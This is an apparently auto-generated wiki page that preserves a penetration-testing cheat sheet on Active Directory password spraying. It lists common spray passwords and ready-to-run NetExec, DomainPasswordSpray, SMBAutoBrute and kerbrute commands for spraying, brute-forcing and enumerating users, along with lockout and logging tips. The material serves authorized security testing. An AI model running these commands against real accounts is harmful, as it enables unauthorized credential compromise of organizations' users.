---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Password - Spraying

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-pwd-spraying` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/pwd-spraying.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Password - Spraying](../../topics/active-directory/password-spraying.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-pwd-spraying |
| name | Password - Spraying |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/pwd-spraying.md |

## Preserved Source Material

````yaml
_body: "# Password - Spraying\n\nPassword spraying refers to the attack method that takes a large number of usernames and\
  \ loops them with a single password.\n\n> The builtin Administrator account (RID:500) cannot be locked out of the system\
  \ no matter how many failed logon attempts it accumulates.\n\nMost of the time the best passwords to spray are :\n\n- Passwords:\
  \ `P@ssw0rd01`, `Password123`, `Password1`,\n- Common password: `Welcome1`/`Welcome01`, `Hello123`, `mimikatz`\n- $Companyname1:`$Microsoft1`\n\
  - SeasonYear: `Winter2019*`, `Spring2020!`, `Summer2018?`, `Summer2020`, `July2020!`\n- Default AD password with simple\
  \ mutations such as number-1, special character iteration (`*`,`?`,`!`,`#`)\n- Empty Password: NT hash is `31d6cfe0d16ae931b73c59d7e0c089c0`\n\
  \n:warning: be careful with the account lockout !\n\n## Spray a pre-generated passwords list\n\n- Using [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)\n\
  \n  ```powershell\n  nxc smb 10.0.0.1 -u /path/to/users.txt -p Password123\n  nxc smb 10.0.0.1 -u Administrator -p /path/to/passwords.txt\n\
  \  \n  nxc smb targets.txt -u Administrator -p Password123 -d domain.local\n  nxc ldap targets.txt -u Administrator -p Password123\
  \ -d domain.local\n  nxc rdp targets.txt -u Administrator -p Password123 -d domain.local\n  nxc winrm targets.txt -u Administrator\
  \ -p Password123 -d domain.local\n  nxc mssql targets.txt -u Administrator -p Password123 -d domain.local\n  nxc wmi targets.txt\
  \ -u Administrator -p Password123 -d domain.local\n\n  nxc ssh targets.txt -u Administrator -p Password123\n  nxc vnc targets.txt\
  \ -u Administrator -p Password123\n  nxc ftp targets.txt -u Administrator -p Password123\n  nxc nfs targets.txt -u Administrator\
  \ -p Password123\n  ```\n\n- Using [hashcat/maskprocessor](https://github.com/hashcat/maskprocessor) to generate passwords\
  \ following a specific rule\n\n  ```powershell\n  nxc smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`\n\
  \  ```\n\n- Using [dafthack/DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) to spray a password against\
  \ all users of a domain.\n\n  ```powershell\n  Invoke-DomainPasswordSpray -Password Summer2021!\n  Invoke-DomainPasswordSpray\
  \ -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt\n  ```\n\n- Using [shellntel-acct/scripts/SMBAutoBrute](https://github.com/shellntel-acct/scripts/blob/master/Invoke-SMBAutoBrute.ps1).\n\
  \n  ```powershell\n  Invoke-SMBAutoBrute -PasswordList \"jennifer, yankees\" -LockoutThreshold 3\n  Invoke-SMBAutoBrute\
  \ -UserList \"C:\\ProgramData\\admins.txt\" -PasswordList \"Password1, Welcome1, 1qazXDR%+\" -LockoutThreshold 5 -ShowVerbose\n\
  \  ```\n\n## BadPwdCount attribute\n\n> The number of times the user tried to log on to the account using an incorrect password.\
  \ A value of `0` indicates that the value is unknown.\n\n```powershell\n$ netexec ldap 10.0.2.11 -u 'username' -p 'password'\
  \ --kdcHost 10.0.2.11 --users\nLDAP        10.0.2.11       389    dc01       Guest      badpwdcount: 0 pwdLastSet: <never>\n\
  LDAP        10.0.2.11       389    dc01       krbtgt     badpwdcount: 0 pwdLastSet: <never>\n```\n\n## Kerberos pre-auth\
  \ bruteforcing\n\nUsing [ropnop/kerbrute](https://github.com/ropnop/kerbrute), a tool to perform Kerberos pre-auth bruteforcing.\n\
  \n> Kerberos pre-authentication errors are not logged in Active Directory with a normal **Logon failure event (4625)**,\
  \ but rather with specific logs to **Kerberos pre-authentication failure (4771)**.\n\n- Username bruteforce\n\n  ```powershell\n\
  \  ./kerbrute_linux_amd64 userenum -d domain.local --dc 10.10.10.10 usernames.txt\n  ```\n\n- Password bruteforce\n\n  ```powershell\n\
  \  ./kerbrute_linux_amd64 bruteuser -d domain.local --dc 10.10.10.10 rockyou.txt username\n  ```\n\n- Password spray\n\n\
  \  ```powershell\n  ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt Password123\n\
  \  ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt rockyou.txt\n  ./kerbrute_linux_amd64\
  \ passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt '123456' -v --delay 100 -o kerbrute-passwordspray-123456.log\n\
  \  ```"
_relative_path: active-directory/pwd-spraying.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/pwd-spraying.md
````
